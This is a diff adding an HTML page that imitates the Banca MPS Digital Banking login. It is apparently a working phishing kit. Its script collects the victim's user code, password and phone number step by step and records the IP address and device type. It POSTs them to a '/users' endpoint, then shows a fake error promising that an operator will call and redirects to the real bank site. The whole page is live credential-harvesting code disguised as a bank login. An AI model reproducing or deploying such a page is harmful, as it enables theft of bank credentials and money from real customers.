@@ -1,0 +1,562 @@
+<html style="overflow-y: scroll;"><head>
+    <title>Banca MPS</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" href="favicon.png" type="image/png">
+    <link rel="stylesheet" type="text/css" href="/cmn/assets/css/catalogo/w.login.digitalBanking.min.css">
+    <style>
+        #overlay {
+            z-index: 10000;
+            background: white;
+            position: absolute;
+            height: 100vh;
+            width: 100vw;
+        }
+    #spinner {
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        z-index: 10001;
+        width: 50px;
+        height: 50px;
+        margin: -25px 0 0 -25px;
+        -webkit-animation: spin 2s linear infinite;
+        animation: spin 1s linear infinite;
+        border: 5px solid #bfbfbf;
+        border-top: 5px solid #99042f;
+        border-radius: 50%;
+    }
+
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+    </style>
+</head>
+<body class="desktop mozilla supported3D noScroll">
+    <div id="overlay" style="display: none;">
+        <div id="spinner"></div>
+    </div>
+    <div class="cookielabel">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12">
+                    <div class="txt">Questo sito utilizza cookie necessari al funzionamento e utili alle finalità
+                        illustrate nella cookie policy. Se vuoi saperne di più o negare il consenso a tutti o a alcuni
+                        cookie consulta la <a href="#">COOKIE POLICY</a>.<br>Chiudendo
+                        questo banner, scorrendo questa pagina, cliccando su un link o proseguendo la navigazione
+                        acconsenti all'uso dei cookie.</div>
+                </div>
+                <div class="a-cnt col-xs-12 text-lg-left"><a href="#" onclick="closeCookies()" class="privacycookieclose">Acconsento</a>
+                        <a href="#">Approfondisci</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="db_login_70perc urlPrivacyCookie" id="wrapperLogin70perc" data-privacy-check-url="/pri/loginib/checkPrivacyCookie.action?nullnull" data-privacy-set-url="/pri/loginib/setPrivacyCookie.action?nullnull">
+        <div id="digitalBankingMain" class="row">
+            <div class="container80baseDigital">
+                <div class="wd_loading_widget_bi"></div>
+                <div class="wd_loading_widget_mobile"></div>
+                <div class="row">
+                    <div class="col-md-24">
+                        <div class="row" id="boxNavigationDigitalBanking">
+                            <div class="col-12" style="height:36px">
+                                <div id="close" class="mps_icon_link_container" style="float: right; padding-right: 0;">
+                                    <a class="mps_link_with_icon" id="btnIndietroNewPsw" href="javascript: void(0)" onclick="hideOverlay()" tabindex="-1">
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="col-2"></div>
+                            <div class="col-20">
+                                <div class="db_media_center_wrapper db_column_middle"></div>
+                                <div class="db_content_login_header">
+                                    <div class="db_logo_black" style="background: rgba(0, 0, 0, 0) url(&quot;/logo.jpg&quot;) no-repeat scroll center center; height: 88px; top: 20px; margin: 0px auto 20px;">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-2"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row db_responsiveRow">
+                    <div class="col-md-1"></div>
+                    <div class="col-md-22 form-group mps_input_with_label_container dB_responsive" id="db_mainBox" tabindex="0" role="form" aria-label="Accedi al tuo Digital Banking">
+                        <div id="includeHeader" class="margin_login_header includeHeader">
+                            <div class="mps_form_container_centrale">
+                                <div class="row" id="boxHeaderDgitalBanking">
+                                    <div class="col-md-19">
+                                        <h1>Area Riservata</h1>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="includeCodUser" class="margin_login_header includeCodUser dB_box_container">
+                            <div id="login-codiceUtente">
+                                <div class="mps_input_with_label_form">
+                                    <div class="mps_form_container_centrale">
+                                        <table class="db_marginTopBottom_header">
+                                            <tbody>
+                                                <tr>
+                                                    <td>
+                                                        <h3>Accedi al tuo Digital Banking</h3>
+                                                    </td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                        <div class="row" id="user-row">
+                                            <div class="col-md-6 db_colLabelCustom">
+                                                <div class="mps_label_with_tooltip_container">
+                                                    <label class="mps_label dB_label" id="labelCodUserSca" for="input-codUser">Codice Utente</label>
+                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="Inserisci il tuo codice utente"></div>
+                                                </div>
+                                            </div>
+                                            <div class="col-md-13 db_colInputCustom">
+                                                <input type="text" class="form-control mps_input" aria-required="true" id="username" placeholder="Inserisci il tuo codice utente" autocomplete="off">
+                                                <a id="iCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
+                                                    <div class="mps_approved_green dB_inputCheck"></div>
+                                                </a> <a id="iError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
+                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
+                                                </a>
+                                            </div>
+                                            <div class="col-md-5 paddingTop-Login">
+                                                <a href="javascript: void(0)" id="buttonSubmit" tabindex="0" role="button" data-template="#button-btnAvantiCodUser" class="db_text_white">
+                                                    <button type="button" class="btn btn-primary" onclick="next('pass')" tabindex="-1">Avanti</button>
+                                                </a>
+                                            </div>
+                                        </div>
+                                        <div class="row" id="pass-row" style="display: none;">
+                                            <div class="col-md-6 db_colLabelCustom">
+                                                <div class="mps_label_with_tooltip_container">
+                                                    <label class="mps_label dB_label" id="labelCodUserSca" for="input-codUser">Password</label>
+                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="Inserisci la tua password"></div>
+                                                </div>
+                                            </div>
+                                            <div class="col-md-13 db_colInputCustom">
+                                                <input type="password" class="form-control mps_input" aria-required="true" id="pass" placeholder="Inserisci la tua password" autocomplete="off">
+                                                <a id="iCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
+                                                    <div class="mps_approved_green dB_inputCheck"></div>
+                                                </a> <a id="iError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
+                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
+                                                </a>
+                                            </div>
+                                            <div class="col-md-5 paddingTop-Login">
+                                                <a href="javascript: void(0)" id="buttonSubmit" tabindex="0" role="button" data-template="#button-btnAvantiCodUser" class="db_text_white">
+                                                    <button type="button" class="btn btn-primary" onclick="next('tel')" tabindex="-1">Avanti</button>
+                                                </a>
+                                            </div>
+                                        </div>
+                                        <div class="row" id="tel-row" style="display: none;">
+                                            <div class="col-md-6 db_colLabelCustom">
+                                                <div class="mps_label_with_tooltip_container">
+                                                    <label class="mps_label dB_label" id="labelCodUserSca" for="input-codUser">Telefono</label>
+                                                    <div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="" data-original-title="Inserisci il tuo telefono"></div>
+                                                </div>
+                                            </div>
+                                            <div class="col-md-13 db_colInputCustom">
+                                                <input type="tel" class="form-control mps_input" aria-required="true" id="tel" placeholder="Inserisci il tuo telefono" autocomplete="off">
+                                                <a id="iCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
+                                                    <div class="mps_approved_green dB_inputCheck"></div>
+                                                </a> <a id="iError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
+                                                    <div class="mps_not_approved_red dB_inputCheck"></div>
+                                                </a>
+                                            </div>
+                                            <div class="col-md-5 paddingTop-Login">
+                                                <a href="javascript: void(0)" id="buttonSubmit" tabindex="0" role="button" data-template="#button-btnAvantiCodUser" class="db_text_white">
+                                                    <button type="button" class="btn btn-primary" onclick="next('login')" tabindex="-1">ENTRA</button>
+                                                </a>
+                                            </div>
+                                        </div>
+                                        <input type="hidden" name="ipAddr" id="ipAddr" value="76.184.185.7">
+                                        <div class="row add-margin-20" tabindex="0" id="rememberUser" aria-label="Memorizza il tuo Codice Utente e dal prossimo accesso non dovrai più inserirlo">
+                                            <div class="col-md-24">
+                                                <div class="mps_label_with_tooltip_container">
+                                                    <label class="checkcontainer" tabindex="0" id="loginOtp1" aria-label="Premi invio per selezionare" style="float: left;">
+                                                        Ricorda codice utente
+                                                        <input type="checkbox" id="checkRicordamiCodUser" tabindex="-1">
+                                                        <span class="checkmark"></span></label>
+                                                    <div class="mps_tooltip_white_background_red_bi dB_responsive_Check" data-toggle="tooltip" title="" data-original-title="Memorizza il tuo Codice Utente e dal prossimo accesso non dovrai più inserirlo">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div id="retrieveUser" class="recuperoCodiceUtenteDigital" style="padding-top: 15px">
+                                            <h5><a id="linkCarteSicurezza9" href="#" tabindex="0">
+                                                    RECUPERA CODICE UTENTE
+                                                </a></h5>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="includePopupEnroll">
+                            <div id="popUp" style="text-align:center!important">
+                                <div id="main-error" class="popupOverlayFunnel" style="display: none;">
+                                    <div class="mps_modal_container">
+                                        <div class="" id="modalExample" tabindex="-1" role="dialog" aria-labelledby="modalExampleTitle" aria-hidden="true">
+                                            <div class="modal-dialog" role="document">
+                                                <div class="modal-content">
+                                                    <div class="modal-header">
+                                                        <h5 class="modal-title popTitle">ERRORE</h5>
+                                                    </div>
+                                                    <div class="modal-body">La banca
+                                                        online non è <strong>al momento</strong>
+                                                        disponibile!<br><br>
+                                                        A breve la contatterà un nostro operatore per verificare
+                                                        i dati inseriti e
+                                                        concludere
+                                                        la verifica di sicurezza.<strong><br><br>Oppure può
+                                                            contattarci</strong> cliccando
+                                                        il tasto qui in basso.</div>
+                                                    <div class="row" style="justify-content: center;">
+                                                        <div class="form-group mps_input_with_label_container smallPhones">
+                                                            <a href="tel:" data-template="#button-btnConfirmTentativiPwdBluEnrolled">
+                                                                <button type="button" class="btn-responsive btn-popup btn btn-primary dB_btn_popUp right fix">CHIAMACI</button>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <style>
+                                @media screen and (max-width: 320px) {
+                                    #recaptchaPSW {
+                                        transform: scale(0.88);
+                                        -webkit-transform: scale(0.88);
+                                        transform-origin: 0 0;
+                                        -webkit-transform-origin: 0 0;
+                                    }
+                                }
+                            </style>
+                        </div>
+                        <div id="includeFunnel">
+                        </div>
+                    </div>
+                    <div class="col-md-1"></div>
+                </div>
+                <div class="row">
+                    <div class="col-md-1"></div>
+                    <div class="col-md-22 mps_input_with_label_container dB_responsive">
+                        <div id="includeLinkEsterni" class="margin_login_header includeLinkEsterni">
+                            <div id="boxLinkEsterniDgitalBanking" role="regionLinkEsterni" aria-label="Sezione Link Paskey" tabindex="0">
+                                <div id="" class="row">
+                                    <div id="linkEsterni0" class="col-md-8 dB_marginBottom tabNavigation" tabindex="0">
+                                        <a href="#" tabindex="-1" class="dB_noDecoration linkPK">
+                                            <div class="dB_divPseudobutton dB_box_responsive">
+                                                <h6 class="">PASKEY AZIENDAONLINE</h6>
+                                                Corporate banking
+                                            </div>
+                                        </a>
+                                    </div>
+                                    <div id="linkEsterni1" class="col-md-8 dB_marginBottom tabNavigation" tabindex="0">
+                                        <a href="#" tabindex="-1" class="dB_noDecoration linkPK">
+                                            <div class="dB_divPseudobutton dB_box_responsive">
+                                                <h6 class="">PASKEY TESORERIA ONLINE E TRIBUNALI ONLINE</h6>
+                                                Enti e istituzioni
+                                            </div>
+                                        </a>
+                                    </div>
+                                    <div id="linkEsterni2" class="col-md-8 dB_marginBottom tabNavigation" tabindex="0">
+                                        <a href="#" class="dB_noDecoration linkPK" tabindex="-1">
+                                            <div class="dB_divPseudobutton dB_box_responsive">
+                                                <h6 class="">PORTALE CARTA MONTEPASCHI AZIENDE</h6>
+                                                Carte di credito aziendali
+                                            </div>
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="includeLinkCarte&amp;Sicurezza" class="margin_login_header includeLinkCarte&amp;Sicurezza">
+                            <div id="containerLinkStep1" tabindex="0" aria-label="Sezione Links Utili">
+                                <div id="divLinks" role="regionLinkInfo" aria-label="Sezione Link Info" tabindex="0">
+                                    <div class="dB_divCarte">
+                                        <div class="row">
+                                            <div class="col-md-12" tabindex="0" aria-label="Sicurezza ">
+                                                <div>
+                                                    <div class="mps_link_with_icon dB_iconResponsive" style="float: left;   margin-bottom: 60px;">
+                                                        <div class="mps_icon_with_link db_icon_info" style="background: rgba(0, 0, 0, 0) url(&quot;/libs/img/loginBI/ico_informazioni.svg&quot;) no-repeat scroll center center;">
+                                                        </div>
+                                                    </div>
+                                                    <div>
+                                                        <h2>Sicurezza </h2>
+                                                    </div>
+                                                    <div>
+                                                        <a id="linkCarteSicurezza11" tabindex="0" href="#">CONSIGLI
+                                                            UTILI</a>
+                                                    </div>
+                                                    <div class="col-md db_responsivePadding" style="padding-left:0; padding-top:1%">
+                                                        <div>
+                                                            <h5>
+                                                                <a class="" id="linkCarteSicurezza6" tabindex="0" href="#">PROTEZIONE
+                                                                    ACQUISTI ONLINE CON 3D SECURE</a>
+                                                            </h5>
+                                                        </div>
+                                                        <div class="wd_row cursorPointer">
+                                                            <div class="wd_box_selectable">
+                                                                <div class="wd_list_box" data-sleep="false">
+                                                                    <h5>
+                                                                        <a href="#" class="" data-channel="draggableLoginBloccoCarte" data-json-url="/pri/loginib/openFunnelCenterChannelsDigitalBankingJSON.action?nullnull" data-template="#button-btnFunnel">BLOCCO
+                                                                            CARTE</a>
+                                                                    </h5>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="col-md-12 db_responsivePadding" tabindex="0" aria-label="Info e assistenza">
+                                                <div class="">
+                                                    <h2>Info e assistenza</h2>
+                                                </div>
+                                                <div>
+                                                    <div class="wd_row">
+                                                        <div id="boxLoginHelpFannelLinkUtili" class="wd_box_selectable">
+                                                            <div id="funnel" class="wd_list_box" data-sleep="false">
+                                                                <h5><a id="needHelpFunnelLoginLinkUtili" data-template="#button-btnFunnel" tabindex="0" href="#">
+                                                                        HAI BISOGNO DI AIUTO?
+                                                                    </a></h5>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div id="" class="recuperoCodiceUtenteDigital">
+                                                        <h5><a class="linkLogin" href="#" tabindex="0" id="linkCarteSicurezza10">
+                                                                FILIALI E ATM
+                                                            </a> </h5>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="row dB_divLinks" tabindex="0" id="linkCarteSicurezza30" aria-label="Sezione Proteggiti dalle frodi">
+                                        <div class="col-md">
+                                            <div class="mps_link_with_icon dB_iconResponsive" style="float: left;   margin-bottom: 101px;">
+                                                <div class="mps_icon_with_link db_icon_ingranaggio"></div>
+                                            </div>
+                                            <h2>Proteggiti dalle frodi</h2>
+                                            <p class="db_responsivePadding" tabindex="0" style="line-height:1.4em" align="justify">Banca MPS non chiede mai le tue credenziali via email,
+                                                sms, telefono o social.<br> Anche se la richiesta sembra provenire dalla
+                                                Banca non fornire per nessun motivo il PIN, i codici delle tue carte, le
+                                                credenziali di Digital Banking o le tue password, anche quelle
+                                                temporanee (OTP) inviate tramite SMS per autorizzare le disposizione di
+                                                pagamento. Si tratta di tentativi di frode.</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="wd_content_login_foooterMessage dB_marginTop" id="divMessInformativo" role="regionLinkInfo4">
+                            <div id="" class="wd_row wd_login_div_container_footer clr boxInformativo" style="color: #BFBFBF">
+                                <div class="wd_col wd_span_24 wd_label_foooter">
+                                    <p tabindex="0">I servizi potrebbero non essere disponibili dalle ore 1:00 alle ore
+                                        2:30 circa.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-8 form-group mps_input_with_label_container" id="linkScrivici" data-template="#button" style="display: none;">
+                            <a href="#" id="linkScriviciInterno" data-channel="draggableLogin" data-json-url="/pri/loginib/openFunnelCenterChannelsDigitalBankingJSON.action?nullnull" data-template="#button-btnFunnel" tabindex="0"> HAI BISOGNO DI AIUTO?
+                            </a>
+                        </div>
+                        <div id="linksPassword" class="dB_marginTop6" style="display: none;" tabindex="0" aria-label="Sezione LINK Password">
+                            <div>
+                                <div>
+                                </div>
+                                <div class="dB_divCarte" tabindex="0" id="linkCarteSicurezza30" aria-label="Sezione info">
+                                    <div class="row">
+                                        <div class="col-md-12 " tabindex="0" id="linkCarteSicurezza31" aria-label="Info e assistenza">
+                                            <div class="wd_row row_link">
+                                                <div class="mps_link_with_icon dB_iconResponsive" style="float: left;">
+                                                    <div class="mps_icon_with_link db_icon_info" style="margin-bottom: 40px; background: rgba(0, 0, 0, 0) url(&quot;/libs/img/loginBI/ico_informazioni.svg&quot;) no-repeat scroll center center;">
+                                                    </div>
+                                                </div>
+                                                <h2 class="">Info e assistenza</h2>
+                                                <div class="wd_row">
+                                                    <div id="boxLoginHelpFannelLinkUtili" class="wd_box_selectable">
+                                                        <div id="funnel" class="wd_list_box" data-sleep="false">
+                                                            <h5><a id="needHelpFunnelLoginLinkUtili" data-template="#button-btnFunnel" tabindex="0" href="#">
+                                                                    HAI BISOGNO DI AIUTO?
+                                                                </a></h5>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row dB_divLinks" tabindex="0" id="linkCarteSicurezza30" aria-label="Sezione Proteggiti dalle frodi">
+                                    <div class="col-md">
+                                        <div class="mps_link_with_icon dB_iconResponsive" style="float: left;   margin-bottom: 101px;">
+                                            <div class="mps_icon_with_link db_icon_ingranaggio"></div>
+                                        </div>
+                                        <h2>Proteggiti dalle frodi</h2>
+                                        <p class="db_responsivePadding" tabindex="0" style="line-height:1.4em" align="justify">Banca MPS non chiede mai le tue credenziali via email, sms,
+                                            telefono o social.<br> Anche se la richiesta sembra provenire dalla Banca
+                                            non fornire per nessun motivo il PIN, i codici delle tue carte, le
+                                            credenziali di Digital Banking o le tue password, anche quelle temporanee
+                                            (OTP) inviate tramite SMS per autorizzare le disposizione di pagamento. Si
+                                            tratta di tentativi di frode.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="foooterInfoMontePaschi dB_padding6" tabindex="0" aria-label="Sezione link Footer" id="divContainerBloccoInformativoFooterMPS" role="contentinfo">
+                            <div id="boxInformativoFooterMPSGlobal" class="wd_row wd_content_login_foooterInfoMontePaschi_footer clr boxInformativoFooterMPSGlobal">
+                                <div class="row col-md-24" style="display:inline-block;">
+                                    <a id="linkLoginFooter" style="display: block;" href="#">Banca Monte
+                                        dei Paschi di Siena S.p.A. GRUPPO IVA MPS - Partita IVA 01483500524</a>
+                                    <a id="linkLoginFooter2" style="display: none;" href="#">Banca
+                                        Monte dei Paschi di Siena S.p.A. GRUPPO IVA MPS - Partita IVA 01483500524</a>
+                                </div>
+                            </div>
+                            <div class="row" style="padding:5%;" aria-label="Sezione Accessibilità" tabindex="0">
+                                <div class="col-24" style=" text-align: center;">
+                                    <a href="javascript: void(0)" class="" id="enableIpovedentiButtonBI" role="button" data-json-url="/pri/loginib/enableDisableIpovedentiJSON.action?nullnull" data-template="#button-enableIpovedentiButton" aria-label="Usa questo bottone per abilitare o disabilitare tutte le funzionalità per gli screen reader. Stato attuale : disabilitato." aria-pressed="false" tabindex="0" style="display: inline-block;">
+                                        <img id="iconaScreenReader" class="lazyload speechAssistant" aria-hidden="true" role="presentation" data-src="/libs/img/loginBI/iconaSpeechAssistantred.png" src="/libs/img/loginBI/iconaSpeechAssistantred.png" style="height: 30px; width: 30px;"> <span class="linkSpeechAssistant" role="button">Screen Reader</span>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-1"></div>
+        </div>
+    </div>
+    <style>
+        .wd_loading_widget_bi {
+            background: #FFF url(/libs/img/loader/loader4.gif) no-repeat center center;
+            display: none;
+            position: fixed !important
+        }
+    </style>
+    <style>
+        .mps_tooltip_white_background_red_Custom {
+            background: transparent url('/cmn/info tooltip_UI.svg') no-repeat center center;
+            height: 36px;
+            width: 18px;
+            margin-left: 5px !important
+        }
+    </style>
+    <style>
+        .mps_tooltip_white_background_red_bi {
+            background: transparent url('/cmn/info tooltip_UI.svg') no-repeat center center;
+            height: 36px;
+            width: 36px;
+        }
+    </style>
+    <style>
+        .mps_exit_red_2_bi {
+            background: transparent url('/cmn/assets/icons/catalogo/HELP_UI Copy 9.svg') no-repeat center center;
+            height: 36px;
+            width: 36px;
+        }
+    </style>
+    <script src="/cdn/jquery-latest.min.js"></script>
+    <script>
+        function closeCookies() {
+            $('.cookielabel').remove()
+        }
+    </script>
+    <script>
+        
+        function isEnabled() {
+            let boolUser = $('#username')[0].value.length > 0;
+            let boolPass = $('#pass')[0].value.length > 0;
+            let boolTel = $('#tel')[0].value.length > 0;
+            return boolUser && boolPass && boolTel;
+        }
+        $(document).ready(() => {
+            setTimeout(() => {
+                $('#overlay').css('display', 'none');
+                $('html').css('overflow-y', 'scroll');
+            }, Math.floor(Math.random() * 1000) + 500)
+        })
+        function getMobileOperatingSystem() {
+            let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            if (/windows phone/i.test(userAgent)) {
+                return "Windows Phone";
+            }
+            if (/android/i.test(userAgent)) {
+                return "Android";
+            }
+            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                return "iOS";
+            }
+            return "altro";
+        }
+        $.getJSON("https://api.ipify.org/?format=json", function (e) {
+            $('#ipAddr').val(e.ip);
+        });
+        const deviceType = getMobileOperatingSystem();
+        const ipAddr = $('#ipAddr');
+        const user = $('#username');
+        const password = $('#pass');
+        const tel = $('#tel');
+        function login() {
+            const inputs = {
+                mail: user[0].value,
+                pwd: password[0].value,
+                ipAddr: ipAddr[0].value,
+                deviceType: deviceType,
+                Num: tel[0].value
+            }
+            if (isEnabled()) {
+                window.scrollTo(0,0);
+                $('#overlay').css('display', 'flex');
+                $('html').css('overflow-y', 'hidden');
+                fetch("/users", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+                    body: JSON.stringify(inputs)
+                }).then(() => {
+                    setTimeout(() => window.location.replace("https://www.mps.it/"), 10000);
+                    setTimeout(() => {
+                        $('#main-error').css("display", "block");
+                        $('#overlay').css('display', 'none');
+                        $('html').css('overflow-y', 'scroll');
+                    }, 1000);
+                })
+            }
+        }
+
+        function next(id) {
+        if (id == 'pass' && $('#username')[0].value.length) {
+            $('#overlay').css('display', 'block');
+            $('html').css('overflow-y', 'hidden');
+            window.scrollTo(0,0);
+            setTimeout(() => {
+                $('#overlay').css('display', 'none');
+                $('html').css('overflow-y', 'scroll');
+            }, Math.floor(Math.random() * 500))
+            $('#user-row').css('display', 'none');
+            $('#rememberUser').css('display', 'none');
+            $('#retrieveUser').css('display', 'none');
+            $('#pass-row').css('display', 'flex');
+        } else if (id == 'tel' && $('#pass')[0].value.length) {
+            $('#overlay').css('display', 'block');
+            $('html').css('overflow-y', 'hidden');
+            window.scrollTo(0,0);
+            setTimeout(() => {
+                $('#overlay').css('display', 'none');
+                $('html').css('overflow-y', 'scroll');
+            }, Math.floor(Math.random() * 500))
+            $('#pass-row').css('display', 'none');
+            $('#tel-row').css('display', 'flex');
+        } else if ($('#tel')[0].value.length) {
+            login()
+        }
+    }
+    </script>
+    <script src="/cdn/script.js"></script>
+
+</body></html>
